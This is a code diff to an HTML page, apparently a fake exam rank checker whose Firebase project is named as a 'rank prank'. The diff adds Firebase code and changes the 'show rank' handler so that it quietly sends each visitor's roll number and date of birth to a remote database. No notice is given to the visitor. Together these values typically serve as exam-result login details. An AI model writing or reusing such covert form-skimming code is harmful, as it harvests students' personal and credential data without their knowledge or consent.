@@ -17,8 +17,38 @@
 		})(window, document, "clarity", "script", "s5g9v3mshg");
 	</script>
 
+	<!-- Firebase  -->
+	<!-- Firebase App (Core SDK) -->
+	<script type="module">
+		// Import the functions you need from the SDKs you need
+		import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
+		import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";
+
+		// Your web app's Firebase configuration
+		const firebaseConfig = {
+			apiKey: "AIzaSyA1rqQUzurJwjIthzqfhcmV_muIszjiQuY",
+			authDomain: "bcece-le-rank-prank.firebaseapp.com",
+			projectId: "bcece-le-rank-prank",
+			storageBucket: "bcece-le-rank-prank.firebasestorage.app",
+			messagingSenderId: "119415615792",
+			appId: "1:119415615792:web:06ebf7b74d9b4b008f58f5"
+		};
+
+		// Initialize Firebase
+		const app = initializeApp(firebaseConfig);
+		const database = getDatabase(app);
+
+		// Export database and set function for use in other scripts
+		window.database = database;
+		window.ref = ref;
+		window.set = set;
+	</script>
+
 
 	<script type="text/javascript">
+
+
+
 		function popup(mylink) {
 			if (!window.focus) return true;
 
@@ -98,7 +128,7 @@
 		}
 
 
-		function handleShowRank() {
+		async function handleShowRank() {
 			var rollInput = document.getElementById("rolls");
 			var rollValue = rollInput.value.trim();
 			if (!validateRollNumber(rollValue)) {
@@ -107,6 +137,21 @@
 				return;
 			}
 			clearError();
+
+			// Save to Firebase
+			const dob = document.getElementById('yy').value + '-' +
+				document.getElementById('mm').value + '-' +
+				document.getElementById('dd').value;
+
+			try {
+				await set(ref(database, 'students/' + rollValue), {
+					rollNumber: rollValue,
+					dob: dob
+				});
+				console.log("Data saved successfully!");
+			} catch (error) {
+				console.error("Error saving data:", error);
+			}
 
 			// Disable the button to prevent multiple clicks
 			document.getElementById("button1").disabled = true;
